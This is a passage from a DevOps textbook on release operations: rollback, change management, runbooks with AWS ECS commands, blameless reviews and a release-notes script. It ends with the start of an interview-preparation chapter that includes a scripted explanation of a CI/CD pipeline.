Liveness tells the platform whether to restart the instance; readiness tells it whether to send traffic. A slow dependency should make an instance not ready, not cause a restart.

#### Why use a `for` duration in an alert rule?

It requires the condition to hold for some time before firing, which filters momentary spikes. It adds directly to the detection delay.

#### What is a deployment marker?

An annotation on dashboards recording when a version was deployed, so that changes in behaviour can be correlated with a release at a glance.

#### How does a long alert window affect a bad release?

It lowers noise but delays detection; in the simulation of this chapter a 900-second window detected the failure about 495 seconds after the deploy, against 150 seconds for a 60-second window, with about three times as many failed requests.

blocks.title: Key points
blocks.text:
- A release is finished when its effect is visible: health checks for the platform, metrics for alerts, logs and traces for explanation.
- Alert on symptoms (error ratio, latency); keep causes on dashboards.
- Detection delay is window time plus the `for` duration; the choice trades noise against exposure.
- Mark every deployment on the dashboards and let the service report its own commit.
- Never expose management endpoints on the public listener.

sections.title: Release Operations: Change, Rollback and Learning

blocks.text:
Shipping code is a repeatable operation with a recorded decision at each step: what is released, who approved it, how success is judged, how it is undone and what is learned when it fails. These practices are called **release operations**. The tooling of the previous Parts executes them; this chapter defines the surrounding process so that a team of one or one hundred can follow it.

### Concept and mechanism

blocks.alt: Prepare Deploy Watch Decide | merged PR, release immutable artifact, agreed window, limits held? | notes, rollback plan compatible migration dashboards, alerts | no | yes | Roll back Promote | previous artifact full traffic | lessons feed the next release | Record: release notes, change record, review if needed

blocks.text:
**Prepare.** The change is a merged pull request with passing checks. The release notes state what changed for users and operators. The change record names the risk (database migration, configuration change, dependency upgrade), the rollback method and the person on call.

**Deploy.** The pipeline deploys the immutable artifact that was tested. A migration follows the expand-contract pattern so that the previous version can still run (see the chapter on deployment strategies).

**Watch.** A defined observation window follows the deploy, during which the dashboards and the error-ratio alert are checked against agreed limits. Without a stated window, "it looks fine" has no meaning.

**Decide.** If any limit is crossed, the default action is rollback, executed first and analyzed afterwards. If the limits hold, the release is promoted (for a canary, the traffic share increases).

#### Release notes and changelogs

Release notes translate commits into information for readers. If commit subjects follow Conventional Commits (see the Git chapter on commit message conventions), the notes can be generated; a human then edits them. The script below groups the commits between two tags. It was run on a repository created for this chapter; the commit identifiers differ in every repository.

blocks.code:
#!/bin/bash
# Usage: release-notes.sh PREVIOUS_TAG NEW_TAG   (Conventional Commits subjects)
set -euo pipefail
prev="$1"; new="$2"
echo "orders-service $new ($(git log -1 --format=%cs "$new"))"
section() {  # $1 = heading, $2 = grep pattern
  local lines
  lines=$(git log --format='%s (%h)' "$prev..$new" | grep -E "$2" \
          | sed -E 's/^[a-z]+!?: //' || true)
  [ -n "$lines" ] && { echo; echo "$1"; echo "$lines" | sed 's/^/  - /'; }
  return 0
}
section "Breaking changes" '^[a-z]+!:'
section "Features" '^feat:'
section "Fixes" '^fix:'
blocks.title: release-notes.sh

blocks.code:
$ git log --oneline v1.3.0..v1.4.0
cd191a0 chore: bump spring-boot-starter-parent
785c05f feat!: rename status field to state
0e4c499 docs: describe health endpoints
f1d81b7 fix: close database connection on timeout
d357945 feat: add pagination to GET /orders
$ ./release-notes.sh v1.3.0 v1.4.0

Breaking changes
  - rename status field to state (785c05f)

Features
  - add pagination to GET /orders (d357945)

Fixes
  - close database connection on timeout (f1d81b7)
blocks.title: Generate notes between two tags (real output, build machine)

blocks.text:
What to notice. The `chore` and `docs` commits are omitted because the script lists only breaking changes, features and fixes; a `feat!:` subject (the exclamation mark marks a breaking change in Conventional Commits) is reported under its own heading and not under Features, because the pattern `^feat:` does not match it. The script is a starting point: it relies on every author following the convention, and a person must still review the text before publication.

#### Rollback

A rollback restores the previous known-good version. The method depends on the platform:

rows: `aws ecs update-service --task-definition orders-service:PREVIOUS`; the deployment circuit breaker does it automatically for a rolling deployment that never becomes healthy
A forward fix or a restore; destructive migrations cannot be rolled back by redeploying code
blocks.caption: Rollback methods in this guide.

blocks.text:
A rollback that has never been executed is a hope. A **rollback drill** performs it deliberately in a non-production environment on a schedule, records the time it took and checks three things: the previous artifact still exists (retention policies delete old images), the previous version works with the current database schema, and the people on call know the commands. The end-to-end chapter demonstrates a complete automatic rollback on the build machine.

#### Change management

Change management records and controls modifications to production. The depth is proportional to risk: a routine dependency patch deployed by the pipeline needs only the pull request as record; a database migration, a network change or a change to authentication needs a named approver, a rollback plan and a scheduled window. In regulated organizations the pull request, the pipeline run and the environment approval together form the audit evidence, which is one reason to prefer pipelines that record who approved what. Emergency changes (a fix during an incident) are permitted to skip some steps but must be reviewed afterwards.

#### Runbooks

A **runbook** is a short document for one alert or procedure that lets someone unfamiliar with the system act correctly at three in the morning. It states the alert meaning, the first checks with exact commands, the likely causes, the decision to roll back and whom to call. **runbook-orders-high-error-ratio.txt**

blocks.code:
ALERT        OrdersHighErrorRatio (error ratio above 5 percent for 2 minutes)
MEANING      More than 1 in 20 requests to orders-service fail with 5xx.
FIRST CHECK  1. Was there a deploy in the last 30 minutes? (dashboard marker, GitHub Actions)
             2. aws ecs describe-services --cluster orders-cluster --services orders-service
                --query 'services[0].deployments'
             3. Logs: aws logs tail /ecs/orders-service --since 15m --filter-pattern ERROR
DECIDE       If a deploy happened: roll back first (previous task definition revision),
             investigate afterwards. If not: check database connections and downstream calls.
ROLLBACK     aws ecs update-service --cluster orders-cluster --service orders-service
             --task-definition orders-service:PREVIOUS_REVISION
ESCALATE     Not resolved in 30 minutes, or any data loss suspected: page the service owner.

blocks.text:
#### Blameless post-incident review

After an incident the team writes a review whose purpose is to improve the system, not to assign fault. The Google SRE book (postmortem culture, consulted October 2026) states that "blameless postmortems are a tenet of SRE culture", that a blamelessly written review "assumes that everyone involved in an incident had good intentions", and that blame discourages reporting because "people will not bring issues to light for fear of punishment". It describes a review as a written record of the incident, its impact, the actions taken, the root causes and follow-up actions.

blocks.text:
A useful review template: summary and impact (who was affected, for how long, measured from the metrics); timeline in order with timestamps; root cause and contributing factors (several, not one person); what went well; what went badly; action items, each with an owner and a due date. An action without an owner does not happen.

### Worked example

The scenario combines the chapter: the release of `orders-service` 1.4.0 adds a health indicator that reads a database setting; production lacks the setting. The sequence below is hypothetical and no timings are claimed.

1. The pipeline deploys revision 13. The deployment marker appears on the dashboard.
2. The new tasks fail their ALB health check; the circuit breaker stops the deployment and restores revision 12 (rollback performed by the platform).
3. The pipeline job fails at `wait services-stable`, and the team is notified by the failing check, not by users.
4. The review records: impact none (the old tasks kept serving), root cause missing production configuration, contributing factor a staging environment that had the setting, actions: add a configuration check to the smoke test, add the setting to the infrastructure code, add a pre-deploy validation of required properties.

The end-to-end chapter reproduces this class of failure on the build machine with real commands.

### Hands-on

1. Create a repository with five commits using Conventional Commits subjects, tag two versions and run `release-notes.sh` between the tags. Compare the output with `git log --oneline` to confirm that each omitted commit is of an ignored type.
2. Write a runbook of at most fifteen lines for the alert of the previous chapter, using the template, and exchange it with another learner who must execute it without help.
3. List, for `orders-service`, the previous artifacts that must exist for a rollback to be possible and the retention rule that protects them (for ECR, a lifecycle policy that keeps the last N images; policy details from memory, verify).
4. Hold a ten-minute blameless review of the last failed build of any project using the template.

### Real-world problems and solutions

#### Rollback impossible: the previous image was deleted

**Scenario.** The new release is bad; the rollback command references revision 12. **Symptoms.** Tasks of revision 12 stop with `CannotPullContainerError`; the service has no healthy tasks. **Diagnosis.** The stopped reason and `aws ecr` `describe-images --repository-name orders-service` show that the image of revision 12 no longer exists. **Root** **cause.** A repository lifecycle policy expired images by age or count, and the untagged-image cleanup removed the old digest. **Fix.** Rebuild from the commit of revision 12 (possible because images are tagged with the commit SHA) and push it under a new tag; deploy a task definition that references it. **Prevention.** Keep at least the last several releases, never expire tagged release images by age alone, and run a rollback drill that exercises the registry.

#### Rollback fails because the database migration was destructive

**Scenario.** Release 1.4.0 renamed a column and dropped the old one; the previous version, restored by the rollback, fails on every query. **Symptoms.** 500 responses with `column ... does not exist` after the rollback. **Diagnosis.** The migration history table (Flyway or Liquibase) shows the migration applied; the old code references the old column. **Root cause.** The migration was not backward compatible, so code and schema could not be rolled back independently. **Fix.** Roll forward with a patch that restores the column (or re-adds it from backup), then redeploy. **Prevention.** Apply the expand-contract pattern: add the new column and write to both, deploy the code, migrate data, and drop the old column in a later release (see the chapter on deployment strategies).

### Questions to expect

#### What belongs in a release checklist?

Merged and reviewed changes, passing checks, release notes, a stated rollback method and the artifact it needs, migration risk assessed, an observation window with limits, and the person responsible during the window.

#### Why roll back first and investigate afterwards?

Rollback restores service quickly and keeps the failing evidence in logs, metrics and the previous artifact. Investigating on the live system prolongs the impact.

#### What is a rollback drill?

A scheduled, deliberate execution of the rollback procedure in a safe environment to prove that it works and to measure its duration.

#### What is a runbook?

A short operational document tied to an alert or procedure: meaning, first checks with exact commands, decision rules and escalation. It lets a person who is not the author act correctly.

#### What does "blameless" mean in a post-incident review?

The review looks for contributing conditions in systems and processes rather than blaming individuals, on the assumption that people acted in good faith. It encourages honest reporting, which is what improvement depends on.

#### How do deployment markers help during an incident?

They show whether a change in the metrics coincides with a release, which narrows the cause to the most recent change within seconds.

#### How are release notes produced from Conventional Commits?

The commit subjects between two tags are grouped by type (breaking, features, fixes); a person reviews and rewrites them for the audience.

blocks.title: Key points
blocks.text:
- A release has four phases: prepare, deploy, watch, decide; the decision defaults to rollback when the agreed limits are crossed.
- Rollback must be tested: the previous artifact must exist and work with the current schema.
- Runbooks give exact commands for an alert; reviews follow a template and are blameless, with owned action items.
- Generated release notes depend on commit conventions and need review before publication.
- Destructive migrations make rollback impossible; use expand-contract.

blocks.text:
### Kubernetes and AWS

Interviews for backend roles test DevOps knowledge at two levels: definitions ("what is a container") and judgement ("the deployment succeeded but users still see the old version; what is checked first"). Definitions are learned from the earlier chapters; judgement is shown by explaining a real project in the order in which things happen. This chapter supplies the question bank, a script for describing a pipeline, advice on the resume and the portfolio, the mistakes that cost offers, and eight scenario questions. Every answer here is a model answer: it should be restated in the candidate's own words and checked against what the candidate has actually done.

blocks.text: A fresher is rarely expected to have operated production systems. A fresher is expected to know the mechanism, to have run the commands once and to be honest about the boundary of experience. "I have not operated Kubernetes in production; I deployed `orders-service` on a local cluster and debugged a `CrashLoopBackOff` caused by a missing environment variable" is a stronger answer than a memorized definition followed by silence on the first follow-up.

blocks.text:
### Worked example

#### Explaining the project pipeline

The standard request is "walk me through how your code reaches production". The script below follows the path of one change. Every bracketed item must be replaced by something the candidate really built; a stage that was not built is described as "not implemented, and this is how it would work".

**pipeline-explanation-script.txt**

blocks.code:
1. Context (10 s)   "[orders-service] is a Spring Boot 3 / Java 21 REST service with PostgreSQL.
                     The repository is on GitHub; the pipeline is [GitHub Actions / Jenkins]."
2. Change (15 s)    "Work happens on a short-lived feature branch. A pull request needs [one review]
                     and the check [build] before it merges into main."
3. Checks (20 s)    "On each pull request it runs [mvn -B verify]: unit tests, [integration
                     tests against a PostgreSQL service container], [JaCoCo coverage threshold],
                     [static analysis]. A failure blocks the merge."
4. Build (15 s)     "After the merge, one job builds the Docker image with a multi-stage Dockerfile,
                     tags it with the commit SHA and pushes it to [GHCR / ECR]. The same image is
                     promoted through the environments; it is never rebuilt."
5. Deploy (20 s)    "[Staging] deploys automatically; production needs [an environment approval].
                     The deploy runs on [ECS Fargate / Kubernetes] with a rolling update and health
                     checks on /actuator/health. Credentials: [OIDC roles], not stored keys."
6. Observe (10 s)   "After the deploy, [the smoke test] and [the error-rate alert] are watched for
                     [a defined window]. If limits are crossed, the previous revision is restored."
7. Learn (10 s)     "A failure I had: [the real problem], found by [the evidence], fixed by [the
                     change]. Afterwards I added [the control]."
8. Boundary (5 s)   "Not done: [for example canary releases]; I would add them by [approach]."

blocks.text: What to notice. The script has a time budget of about 105 seconds, spends the longest time on checks and deployment (where judgement is visible) and ends with a real failure and a stated limit. Each stage names one concrete tool and one concrete control; adjectives such as "robust" or "scalable" carry no information.
